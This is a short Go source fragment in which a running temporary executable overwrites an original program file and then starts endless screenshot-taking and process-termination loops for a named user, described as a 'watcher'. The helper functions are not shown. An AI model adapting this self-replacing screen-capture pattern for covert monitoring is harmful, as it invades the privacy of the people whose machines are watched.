package main

import (
	"fmt"
	"os"
	"runtime"
)

// 2-nd run as temp

func overwriteOrgFile(orgExec string) {

	tempPath, _ := os.Executable()

	err := os.Rename(tempPath, orgExec)
	if err != nil {
		fmt.Println("I cannot overwrite file:", err)
		return
	}

	fmt.Println("Org file overwritten:", tempPath, "->", orgExec)

	userName := os.Args[1]

	_ = sendFakeShot(userName, "starting loops in one piece watcher on "+runtime.GOOS)

	go screenshotingLoop(userName)
	go terminationLoop(userName)

	select {}
}
